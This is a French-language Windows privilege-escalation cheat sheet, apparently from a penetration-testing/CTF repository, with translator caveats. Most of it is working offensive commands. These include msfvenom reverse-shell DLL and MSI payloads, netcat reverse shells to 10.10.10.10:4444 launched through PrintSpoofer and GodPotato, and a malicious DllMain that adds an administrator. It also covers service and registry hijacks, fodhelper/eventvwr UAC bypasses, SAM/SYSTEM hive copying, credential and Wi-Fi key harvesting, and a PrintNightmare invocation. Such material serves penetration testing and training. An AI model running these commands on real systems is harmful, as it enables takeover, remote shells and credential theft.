# 🪟 Élévation de privilèges Windows — aide-mémoire complet

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗    ██╗██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗███████╗
  ██║    ██║██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║██╔════╝
  ██║ █╗ ██║██║██╔██╗ ██║██║  ██║██║   ██║██║ █╗ ██║███████╗
  ██║███╗██║██║██║╚██╗██║██║  ██║██║   ██║██║███╗██║╚════██║
  ╚███╔███╔╝██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝███████║
   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Windows-PrivEsc-blue?style=for-the-badge" alt="Élévation de privilèges Windows">
  <img src="https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge" alt="Après exploitation">
  <img src="https://img.shields.io/badge/SYSTEM-Access-red?style=for-the-badge" alt="SYSTEM">
  <img src="https://img.shields.io/badge/CTF-Ready-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Guide complet de l’élévation de privilèges sur les systèmes Windows</b>
</p>

---

## 📋 Table des matières

- [Énumération](#-énumération)
- [Exploitation des services](#-exploitation-des-services)
- [Chemins de services sans guillemets](#-chemins-de-services-sans-guillemets)
- [Détournement du chargement de DLL](#-détournement-du-chargement-de-dll)
- [AlwaysInstallElevated](#-alwaysinstallelevated)
- [Identifiants enregistrés](#-identifiants-enregistrés)
- [Manipulation des jetons](#-manipulation-des-jetons)
- [Attaques Potato](#-attaques-potato)
- [Exploitation du registre](#-exploitation-du-registre)
- [Tâches planifiées](#-tâches-planifiées)
- [Contournement de l’UAC](#-contournement-de-luac)
- [Exploitation du noyau](#-exploitation-du-noyau)
- [Référence rapide](#-référence-rapide)
- [Ressources](#-ressources)

---

## 🔍 Énumération

> **Précision de lecture :** « énumération » signifie ici l’inventaire du système et des droits. Les lignes commençant par `#` dans les blocs cmd sont des annotations du guide, pas des commentaires exécutables de cmd.exe ; certains blocs mélangent cmd et PowerShell. Les noms de groupes et les chemins restent ceux de l’original et peuvent dépendre de la langue du système. Les exemples `wmic` sont anciens : l’utilitaire a été retiré de versions actuelles de Windows 11, sans retirer WMI. `Get-WmiObject` appartient à Windows PowerShell et n’existe pas dans PowerShell 7 ([Microsoft : WMIC](https://support.microsoft.com/en-gb/servicing/os/windows/docs/2025/09/windows-management-instrumentation-command-line-wmic-removal-from-windows), [PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/differences-from-windows-powershell)).

### Informations système

```cmd
# Informations système
systeminfo
hostname

# Version du système
ver
wmic os get caption,version,buildnumber

# Architecture
echo %PROCESSOR_ARCHITECTURE%

# Correctifs et mises à jour
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Informations sur les utilisateurs

```cmd
# Utilisateur actuel
whoami
whoami /all
whoami /priv
whoami /groups

# Tous les utilisateurs
net user
net localgroup administrators

# Détails de l’utilisateur
net user username

# Privilèges actuels
whoami /priv
```

### Informations réseau

```cmd
# Configuration IP
ipconfig /all

# Routes
route print

# Ports ouverts
netstat -ano
netstat -an | findstr LISTENING

# Table ARP
arp -a

# Cache DNS
ipconfig /displaydns
```

### Processus et services

```cmd
# Processus en cours
tasklist
tasklist /svc
wmic process list full

# Services
sc query
net start
wmic service list brief

# Pilotes
driverquery
```

### Énumération avec PowerShell

```powershell
# Informations système
Get-ComputerInfo

# Utilisateurs
Get-LocalUser
Get-LocalGroupMember Administrators

# Services
Get-Service

# Processus
Get-Process

# Logiciels installés
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher, InstallDate
```

---

<a id="-exploitation-des-services"></a>
## ⚙️ Exploitation des services

### Rechercher des services vulnérables

```cmd
# Lister les services
sc query state= all

# Permissions des services
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *

# Vérifier un service précis
sc qc servicename
```

### Permissions insuffisamment restrictives sur les services

> **Précision :** les deux lignes `sc config` illustrent des alternatives ; exécutées successivement, la seconde remplace la première. Modifier la configuration, arrêter et démarrer un service demandent des droits distincts, et l’effet dépend du compte du service. Un chemin sans guillemets ne suffit pas non plus : il faut notamment pouvoir écrire à un emplacement essayé et déclencher l’exécution ([droits des services](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)).

```cmd
# Si la configuration du service est modifiable :
sc config servicename binpath= "C:\Users\Public\shell.exe"
sc config servicename binpath= "net localgroup administrators user /add"
sc stop servicename
sc start servicename
```

### Permissions insuffisamment restrictives sur les exécutables des services

```cmd
# Vérifier les permissions de l’exécutable
icacls "C:\Program Files\Service\binary.exe"

# Si l’écriture est autorisée, remplacer par un exécutable malveillant
copy shell.exe "C:\Program Files\Service\binary.exe"
sc stop servicename
sc start servicename
```

### Vérification des services avec PowerShell

> **Précision :** `Get-ModifiableService` provient de PowerUp ; ce n’est pas une commande PowerShell intégrée ([source PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)).

```powershell
# Obtenir les informations des services
Get-WmiObject win32_service | Select-Object Name, StartName, PathName

# Rechercher les services modifiables
Get-ModifiableService
```

---

## 📂 Chemins de services sans guillemets

### Rechercher les chemins sans guillemets

```cmd
# Rechercher les chemins de services sans guillemets
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell
Get-WmiObject win32_service | Select-Object Name,PathName | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}
```

### Exploiter un chemin sans guillemets

```
# Si le chemin est : C:\Program Files\Vulnerable Service\service.exe
# Windows recherche :
# 1. C:\Program.exe
# 2. C:\Program Files\Vulnerable.exe
# 3. C:\Program Files\Vulnerable Service\service.exe

# Placer un exécutable malveillant :
copy shell.exe "C:\Program Files\Vulnerable.exe"

# Redémarrer le service
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

---

## 📚 Détournement du chargement de DLL

### Rechercher les DLL manquantes

> **Précision :** l’ordre ci-dessous est simplifié et dépend du type d’application, des API de chargement et du mode de recherche sécurisé. Un résultat `NAME NOT FOUND` ne prouve pas à lui seul qu’une DLL contrôlée sera chargée. Le bloc suivant mélange une commande msfvenom et du C ; ce n’est pas un fichier C compilable tel quel. L’appel à `system()` dans `DllMain` est un schéma illustratif, soumis aux contraintes du verrou du chargeur ([ordre de recherche](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order), [bonnes pratiques DLL](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-best-practices)).

```cmd
# Utiliser Process Monitor pour rechercher les DLL manquantes
# Filtre : Result = NAME NOT FOUND, Path se termine par .dll

# Emplacements couramment parcourus :
# 1. Répertoire de l’application
# 2. C:\Windows\System32
# 3. C:\Windows
# 4. Répertoire courant
# 5. Répertoires de PATH
```

### Créer une DLL malveillante

```c
// Payload (charge utile) msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o evil.dll

// Ou compiler une DLL personnalisée :
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators user /add");
    }
    return TRUE;
}
```

### Exploitation

```cmd
# Copier la DLL dans un répertoire modifiable du chemin de recherche
copy evil.dll "C:\Program Files\App\missing.dll"

# Déclencher le chargement de la DLL par l’application
# Redémarrer le service ou l’application
```

---

## 📦 AlwaysInstallElevated

### Rechercher la configuration vulnérable

```cmd
# Les deux valeurs doivent être définies à 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Exploitation

```bash
# Générer un MSI malveillant
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# Transférer et exécuter
msiexec /quiet /qn /i evil.msi
```

---

## 🔑 Identifiants enregistrés

### Gestionnaire d’identifiants

```cmd
# Lister les identifiants enregistrés
cmdkey /list

# Utiliser les identifiants enregistrés
runas /savecred /user:Administrator cmd.exe
```

### SAM et SYSTEM

> **Précision :** les fichiers de ruches actifs peuvent être verrouillés ; le compte SYSTEM ou les privilèges de sauvegarde ne garantissent pas que les simples copies ci-dessous réussiront. Les clichés doivent exister et être accessibles. Les exemples sont conservés ; les privilèges de sauvegarde/restauration concernent les contrôles d’accès et ne signifient pas un accès universel sans conditions ([privilèges Windows](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants), [partage des fichiers](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)).

```cmd
# Copier les fichiers SAM (nécessite SYSTEM)
copy C:\Windows\System32\config\SAM C:\Users\Public\SAM
copy C:\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM

# Depuis les clichés instantanés
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
```

### Identifiants dans le registre

```cmd
# Mots de passe de connexion automatique
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# Mots de passe VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Sessions PuTTY
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### Fichiers contenant des mots de passe

```cmd
# Rechercher des mots de passe
findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*

# Fichiers de réponse d’installation sans assistance
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\System32\sysprep.inf
C:\Windows\System32\sysprep\sysprep.xml

# Historique PowerShell
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Configuration IIS
type C:\inetpub\wwwroot\web.config
```

### Mots de passe Wi-Fi

```cmd
# Lister les profils
netsh wlan show profiles

# Obtenir le mot de passe
netsh wlan show profile name="SSID" key=clear
```

---

## 🎭 Manipulation des jetons

### Vérifier les privilèges

```cmd
whoami /priv

# Privilèges sensibles :
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeTcbPrivilege
# SeBackupPrivilege
# SeRestorePrivilege
# SeCreateTokenPrivilege
# SeLoadDriverPrivilege
# SeTakeOwnershipPrivilege
# SeDebugPrivilege
```

### SeImpersonatePrivilege

```cmd
# Si SeImpersonatePrivilege est activé :
# Utiliser les attaques Potato (JuicyPotato, PrintSpoofer, etc.)

# PrintSpoofer
PrintSpoofer.exe -i -c "cmd"
PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd"

# GodPotato
GodPotato.exe -cmd "cmd /c whoami"
```

### SeBackupPrivilege

```cmd
# Permet de lire tout fichier
# Copier SAM et SYSTEM
robocopy /b C:\Windows\System32\config C:\Users\Public SAM SYSTEM
```

### SeRestorePrivilege

```cmd
# Permet d’écrire à tout emplacement
# Remplacer des fichiers système
```

---

## 🥔 Attaques Potato

### JuicyPotato (Windows Server 2016/2019)

> **Exemple historique :** le titre original est trop large. Le mainteneur de JuicyPotato indique que Windows 10 1809 et Windows Server 2019 sont corrigés pour cette technique. La seule présence de SeImpersonatePrivilege ne garantit pas le succès des exemples Potato ; versions, correctifs et services nécessaires comptent ([discussion officielle du projet](https://github.com/ohpe/juicy-potato/issues/4)).

```cmd
# Nécessite SeImpersonatePrivilege ou SeAssignPrimaryToken
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup administrators user /add" -t *
```

### PrintSpoofer (Windows 10/Server 2016+)

```cmd
# Nécessite SeImpersonatePrivilege
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe 10.10.10.10 4444 -e cmd"
```

### RoguePotato

```cmd
RoguePotato.exe -r 10.10.10.10 -e "cmd /c whoami > C:\Users\Public\out.txt" -l 9999
```

### GodPotato (Windows 10/11/Server 2019-2022)

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.10.10 4444"
```

---

## 📝 Exploitation du registre

### Démarrage automatique (AutoRuns)

> **Précision :** une entrée Run s’exécute à l’ouverture de session dans le contexte de l’utilisateur concerné ; son ajout ne donne pas automatiquement SYSTEM. De même, modifier ou créer une tâche planifiée demande les droits appropriés et le contexte d’exécution de la tâche détermine les privilèges ([Microsoft : Run et RunOnce](https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)).

```cmd
# Vérifier les emplacements de démarrage automatique
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Si l’écriture est autorisée, ajouter une entrée malveillante
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\Public\shell.exe"
```

### Clés de registre des services

```cmd
# Vérifier les permissions du registre des services
accesschk.exe -kvuqws "Everyone" HKLM\System\CurrentControlSet\Services

# Modifier ImagePath du service
reg add "HKLM\SYSTEM\CurrentControlSet\Services\vulnerable" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\Public\shell.exe" /f
```

---

## ⏰ Tâches planifiées

### Lister les tâches planifiées

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo TABLE

# PowerShell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
```

### Rechercher les scripts de tâches modifiables

```cmd
# Si la tâche exécute un script que vous pouvez modifier :
icacls "C:\Scripts\backup.bat"

# Ajouter une commande malveillante
echo net localgroup administrators user /add >> C:\Scripts\backup.bat
```

### Créer une tâche malveillante

```cmd
# Si vous avez le droit de créer des tâches
schtasks /create /tn "Evil" /tr "C:\Users\Public\shell.exe" /sc onlogon /ru SYSTEM
```

---

<a id="-contournement-de-luac"></a>
## 🛡️ Contournement de l’UAC

> **Précision :** les exemples sont historiques et dépendent des versions, correctifs et paramètres UAC. Un contournement de la demande de consentement n’est pas une garantie de transformer un compte standard en administrateur ; l’UAC utilise notamment des jetons distincts pour les administrateurs ([documentation Microsoft](https://learn.microsoft.com/en-us/windows/win32/secauthz/user-account-control)).

### Vérifier le niveau de l’UAC

```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

### Contournement avec Fodhelper

```cmd
# Fonctionne sous Windows 10
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
fodhelper.exe

# Nettoyage
reg delete HKCU\Software\Classes\ms-settings /f
```

### Contournement avec l’Observateur d’événements

```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
```

---

## 💣 Exploitation du noyau

### Vérifier les informations système

```cmd
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Exploits courants

> **Précision :** ce tableau historique mélange des bulletins MS et des CVE, ainsi que des failles de services et du noyau. « Toutes » et les versions indiquées sont des raccourcis, pas une matrice de compatibilité. PrintNightmare concerne le spouleur d’impression ; sa simple présence ne prouve pas une vulnérabilité, et le nom `CVE-2021-1675.ps1` ne permet pas d’assimiler les CVE. Vérifier les produits, correctifs et conditions propres à chaque avis ([Microsoft : PrintNightmare](https://www.microsoft.com/en-us/msrc/blog/2021/07/clarified-guidance-for-cve-2021-34527-windows-print-spooler-vulnerability), [CVE-2020-0796](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796)).

| CVE | Version de Windows | Nom |
|-----|-----------------|------|
| MS08-067 | XP/2003 | NetAPI |
| MS16-032 | 7/8/10/2012 | Secondary Logon |
| MS17-010 | Toutes | **EternalBlue** |
| CVE-2020-0796 | 10/Server 2019 | **SMBGhost** |
| CVE-2021-1732 | 10/Server | Win32k |
| CVE-2021-34527 | Toutes | **PrintNightmare** |

### PrintNightmare (CVE-2021-34527)

```cmd
# Vérifier si le système est vulnérable
Get-Service Spooler

# Exploitation (PowerShell)
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "password123!" -DriverName "Xerox"
```

---

## 📊 Référence rapide

### Énumération en une ligne

```cmd
# Informations rapides
whoami /all & systeminfo & net user

# Vérifier les privilèges
whoami /priv

# Services
wmic service get name,pathname | findstr /i /v "c:\windows"

# Tâches planifiées
schtasks /query /fo LIST /v | findstr /i "taskname\|run"
```

### Outils automatisés

| Outil | Description |
|------|-------------|
| **WinPEAS** | Énumération complète |
| **PowerUp** | Élévation de privilèges avec PowerShell |
| **Seatbelt** | Vérifications de sécurité |
| **SharpUp** | Vérifications d’élévation de privilèges en C# |

### Liste de vérification des pistes rapides

- [ ] `whoami /priv` — Vérifier SeImpersonate
- [ ] Chemins de services sans guillemets
- [ ] Exécutables de services modifiables
- [ ] AlwaysInstallElevated
- [ ] Identifiants enregistrés (cmdkey /list)
- [ ] Mots de passe de connexion automatique dans le registre
- [ ] Permissions insuffisamment restrictives sur les services
- [ ] Scripts de tâches planifiées
- [ ] Version du noyau — PrintNightmare ?

---

## 📚 Ressources

- [LOLBAS](https://lolbas-project.github.io/)
- [Élévation de privilèges Windows — HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Aide-mémoire associés

> **Lien hérité :** la fiche WinPEAS référencée ci-dessous est absente du dépôt source copié ; le lien est conservé pour signaler cette dépendance manquante.

- WinPEAS — guide pas encore disponible
- [Élévation de privilèges Linux](../../Linux-PrivEsc/translations/README.fr.md)

---

<p align="center">
  <b>🪟 Obtenez les privilèges SYSTEM !</b><br>
  <i>Maîtrisez l’élévation de privilèges Windows</i>
</p>
